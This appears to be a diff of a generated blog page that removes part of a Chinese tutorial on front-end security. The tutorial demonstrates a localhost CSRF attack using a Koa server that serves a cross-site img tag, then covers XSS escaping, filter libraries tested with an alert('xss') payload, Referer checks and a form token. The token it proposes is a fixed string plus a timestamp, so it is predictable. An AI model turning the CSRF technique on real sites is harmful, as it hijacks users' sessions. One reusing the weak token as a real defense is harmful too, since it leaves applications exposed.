-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> Koa = <span class="keyword">require</span>(<span class="string">'koa'</span>);</div><div class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> Koa();</div><div class="line"></div><div class="line">app.<span class="keyword">use</span>(async ctx =&gt; &#123;</div><div class="line">    ctx.body = <span class="string">"&lt;img src='http://localhost:3000/' /&gt;"</span>;</div><div class="line">&#125;);</div><div class="line"></div><div class="line">app.listen(<span class="number">5000</span>);</div></pre></td></tr></table></figure>
-<p>可以看到：</p>
-<pre><code>1，最简单的一个koa服务
-2，只要访问服务器，服务器就返回一个img标签，标签的src属性，指向网站A,也就是localhost:3000
-3，服务监听在5000端口
-</code></pre><p>ok，网站B已经准备好，那么重新进行测试</p>
-<h4 id="一，清除cookie"><a href="#一，清除cookie" class="headerlink" title="一，清除cookie"></a>一，清除cookie</h4><p>因为session依赖cookie，如果清除cookie，那就相当于新用户了。</p>
-<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fkgfb2e4qtj30ze0fwacj.jpg" alt=""></p>
-<p>清除cookie之后，我们再访问页面</p>
-<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fkgfbyfmq0j30ea0f8wge.jpg" alt=""></p>
-<p>可以看到访问次数已经变成1了。</p>
-<h4 id="二，用户A访问网站A"><a href="#二，用户A访问网站A" class="headerlink" title="二，用户A访问网站A"></a>二，用户A访问网站A</h4><p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fkgfe1e9cej30dy05kwf2.jpg" alt=""></p>
-<p>清除cookie，并访问localhost：3000，可以看到是同一用户的第一次访问。</p>
-<h4 id="三，用户A访问网站B"><a href="#三，用户A访问网站B" class="headerlink" title="三，用户A访问网站B"></a>三，用户A访问网站B</h4><p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fkgfg731syj30rm0a6gna.jpg" alt=""></p>
-<p>可以看到，返回的页面中，渲染了一个img并指向了3000端口</p>
-<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fkgfhxyvbcj31hu0e6wi8.jpg" alt=""></p>
-<p>查看network，可以看到这是一个get请求，并且cookie被成功携带在了请求头上。</p>
-<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fkgfj9hcoej30ea06qgmb.jpg" alt=""></p>
-<p>而网站A的服务器上，也确实接受到了用户A的请求</p>
-<p>至此：一次成功的csrf攻击就完成了。</p>
-<h1 id="四，前端攻击的防御"><a href="#四，前端攻击的防御" class="headerlink" title="四，前端攻击的防御"></a>四，前端攻击的防御</h1><p>防御分为前端防御和后端防御，这里主要讲一下前端防御，防御的要点：</p>
-<pre><code>1，不信任原则
-2，双重校验
-3，输入输出节点敏感
-</code></pre><h2 id="4-1，sql防御"><a href="#4-1，sql防御" class="headerlink" title="4.1，sql防御"></a>4.1，sql防御</h2><p>sql防御的关键点，就是添加filter过滤器，过滤掉敏感字符</p>
-<h2 id="4-2，xss防御"><a href="#4-2，xss防御" class="headerlink" title="4.2，xss防御"></a>4.2，xss防御</h2><p>xss攻击是所有攻击中花样最多的，防御难度大，防御的核心思想同样是过滤敏感字符：</p>
-<p>最简单的就是过滤常见的标签</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">content</div><div class="line">  .replace(<span class="regexp">/&amp;/g</span>, <span class="string">"&amp;amp;"</span>)</div><div class="line">  .replace(<span class="regexp">/&lt;/g</span>, <span class="string">"&amp;lt;"</span>)</div><div class="line">  .replace(<span class="regexp">/&gt;/g</span>, <span class="string">"&amp;gt;"</span>)</div><div class="line">  .replace(<span class="regexp">/"/g</span>, <span class="string">"&amp;quot;"</span>)</div><div class="line">  .replace(<span class="regexp">/'/g</span>, <span class="string">"&amp;#039;"</span>)</div></pre></td></tr></table></figure>
-<p>这样可以解决大部分xss攻击的问题，但还是不够全面，毕竟还存在属性，href伪脚本之类的攻击方式</p>
-<p>所以，具体的防御可以从五个方向上：</p>
-<p>1，注入到html标签之间</p>
-<p>2，注入html的普通属性值</p>
-<p>3，注入javascript中时</p>
-<p>4，进入css中时</p>
-<p>5，进入url中时</p>
-<p>从这5个方向进行防御，可以自己写过滤器，也可以使用开源的xss防御库</p>
-<blockquote>
-<p>xss</p>
-<p>node-esapi</p>
-</blockquote>
-<p>上面这两个库都是用来防御xss的</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> ESAPI = <span class="built_in">require</span>(<span class="string">'node-esapi'</span>);</div><div class="line">ESAPI.encoder().encodeForHTML(<span class="string">'&lt;p&gt;This is a test&lt;/p&gt;'</span>);<span class="comment">//过滤html</span></div><div class="line">ESAPI.encoder().encodeForHTMLAttribute(<span class="string">'...str...'</span>);<span class="comment">//过滤属性</span></div><div class="line">ESAPI.encoder().encodeForJavaScript(<span class="string">'...str...'</span>)<span class="comment">//过滤js</span></div><div class="line">ESAPI.encoder().encodeForCSS(<span class="string">'...str...'</span>)<span class="comment">//过滤css</span></div><div class="line">ESAPI.encoder().encodeForURL(<span class="string">'...str...'</span>)<span class="comment">//过滤url</span></div></pre></td></tr></table></figure>
-<p>或者使用xss：</p>
-<figure class="highlight dust"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="xml">var xss = require("xss");</span></div><div class="line"><span class="xml">var html = xss('<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">"xss"</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>');</span></div><div class="line"><span class="xml">console.log(html);</span></div><div class="line"><span class="xml"></span></div><div class="line"><span class="xml">myxss = new xss.FilterXSS(</span><span class="template-variable">&#123;</span></div><div class="line"><span class="template-variable">  css: &#123;</span></div><div class="line"><span class="template-variable">    whiteList: &#123;</span></div><div class="line"><span class="template-variable">      position: /^fixed|relative$/,</span></div><div class="line"><span class="template-variable">      top: true,</span></div><div class="line"><span class="template-variable">      left: true</span></div><div class="line"><span class="template-variable">    &#125;</span><span class="xml"></span></div><div class="line"><span class="xml">  &#125;</span></div><div class="line"><span class="xml">&#125;);</span></div><div class="line"><span class="xml">html = myxss.process('<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">"xss"</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>');</span></div></pre></td></tr></table></figure>
-<p>在这里推荐xss，因为node-esapi很久没有维护了，可以通过读源码，选择适合项目的过滤实现</p>
-<h2 id="4-3，csrf防御"><a href="#4-3，csrf防御" class="headerlink" title="4.3，csrf防御"></a>4.3，csrf防御</h2><h3 id="1，get换post"><a href="#1，get换post" class="headerlink" title="1，get换post"></a>1，get换post</h3><p>使用post，提升伪造难度</p>
-<h3 id="2，Referer"><a href="#2，Referer" class="headerlink" title="2，Referer"></a>2，Referer</h3><p>可以在服务器端，通过ctx.headers.referer，来获取本次请求得源地址。</p>
-<p>可以在网站A的服务器中获取：<br><figure class="highlight dart"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">router.<span class="keyword">get</span>(<span class="string">'/'</span>, <span class="keyword">async</span> (ctx, next) =&gt; &#123;</div><div class="line">  let <span class="built_in">num</span> = ctx.session.<span class="built_in">num</span> || <span class="number">0</span></div><div class="line">  ctx.session.<span class="built_in">num</span> = ++<span class="built_in">num</span>;</div><div class="line">  console.log(<span class="string">"用户访问次数："</span> + ctx.session.<span class="built_in">num</span>);</div><div class="line">  console.log(ctx.headers.referer);</div><div class="line">  <span class="keyword">await</span> ctx.render(<span class="string">'index'</span>, &#123;&#125;)</div><div class="line">&#125;)</div></pre></td></tr></table></figure></p>
-<p>上面添加了一句获取referer</p>
-<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fkgghd545qj30ec06iq3o.jpg" alt=""></p>
-<p>再次刷新页面5000端口得页面，可以看到这个请求来自5000端口，既然这样，我们就可以对此进行过滤</p>
-<p>但referer是依赖浏览器的，不敢保证浏览器是否有漏洞，被人篡改请求头，所以还不是最终的解决方案</p>
-<h3 id="3，最合理token"><a href="#3，最合理token" class="headerlink" title="3，最合理token"></a>3，最合理token</h3><p>再次修改服务器A的代码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">router.get(<span class="string">'/'</span>, <span class="keyword">async</span> (ctx, next) =&gt; &#123;</div><div class="line">  <span class="keyword">let</span> signature = <span class="string">"!@#$%"</span>;</div><div class="line">  <span class="keyword">let</span> token = <span class="string">`<span class="subst">$&#123;signature&#125;</span><span class="subst">$&#123;<span class="keyword">new</span> <span class="built_in">Date</span>().getTime()&#125;</span>`</span>;</div><div class="line">  ctx.session.token = token</div><div class="line">  <span class="keyword">await</span> ctx.render(<span class="string">'index'</span>, &#123;</div><div class="line">    token</div><div class="line">  &#125;)</div><div class="line">&#125;)</div></pre></td></tr></table></figure></p>
-<p>可以看到：</p>
-<pre><code>1，在session中添加了token
-2，将token渲染到页面
-</code></pre><p>接着修改html代码：<br><figure class="highlight erb"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></div><div class="line"><span class="xml">    　<span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"get"</span> <span class="attr">action</span>=<span class="string">"/test"</span>&gt;</span></span></div><div class="line"><span class="xml">  　　　　<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"token"</span> <span class="attr">value</span>=<span class="string">"&lt;%=</span></span></span><span class="ruby"> token</span><span class="xml"><span class="tag"><span class="string">%&gt;"</span>&gt;</span></span></div><div class="line"><span class="xml">  　　　　<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit"</span>&gt;</span></span></div><div class="line"><span class="xml">  　　<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></div><div class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></div></pre></td></tr></table></figure></p>
-<p>ejs模版，注入了一个token字段</p>
-<p>此时，页面如下图：</p>
-<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fkghdzfbg1j30di064mxj.jpg" alt=""></p>
-<p>只有一个submit按钮，点击按钮之后，进行了表单提交，访问了test接口，生成如下链接：</p>
-<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fkghelk4swj30sm02674t.jpg" alt=""></p>
-<p>服务器A上test接口对应的处理函数，如下：<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">router.<span class="built_in">get</span>('/<span class="keyword">test</span>', async (ctx, next) =&gt; &#123;</div><div class="line">    console.<span class="built_in">log</span>(ctx.<span class="keyword">query</span>.<span class="keyword">token</span>);</div><div class="line">    console.<span class="built_in">log</span>(ctx.session.<span class="keyword">token</span>);</div><div class="line">    let text = <span class="string">"token校验通过"</span>;</div><div class="line">    <span class="keyword">if</span>(ctx.<span class="keyword">query</span>.<span class="keyword">token</span> !== ctx.session.<span class="keyword">token</span>)&#123;</div><div class="line">    text = <span class="string">"token校验不通过"</span>;</div><div class="line">    &#125;</div><div class="line">    ctx.body = text</div><div class="line">&#125;)</div></pre></td></tr></table></figure></p>
-<p>查看控制台：</p>
-<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fkghhi6gwgj30fo06gt9j.jpg" alt=""></p>
-<p>可以看到，通过query拿到的token和通过session拿到的token一样</p>
-<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fkghih7jjij30ve04mt9u.jpg" alt=""></p>
-<p>此时，页面输出为，token校验通过。</p>
-<h3 id="csrf防御总结"><a href="#csrf防御总结" class="headerlink" title="csrf防御总结"></a>csrf防御总结</h3><p>上述3种方案，可以结合在一起使用</p>
-<p>token方案，为什么说安全，是因为，动态加密串写在了cookie当中，而攻击者，无法从cookie中拿到signature，所以即便他通过csrf拿到了cookie，但也无法在表单中生成对应的token字段。</p>
-<p>总结：今天讲了xss csrf，简单了解前端漏洞的危害，攻击方式，以及防御方式，大家对前端漏洞有了一定的了解，希望能给大家在以后的开发工作中带来一定的启发。</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-    <div>
-      
-    </div>
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2535,7 +2441,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives/">
-                <span class="site-state-item-count">24</span>
+                <span class="site-state-item-count">25</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -2621,7 +2527,7 @@
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共39.0k字</span>
+  <span class="post-count">博客全站共39.8k字</span>
 </div>
 <span>Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a></span>
 
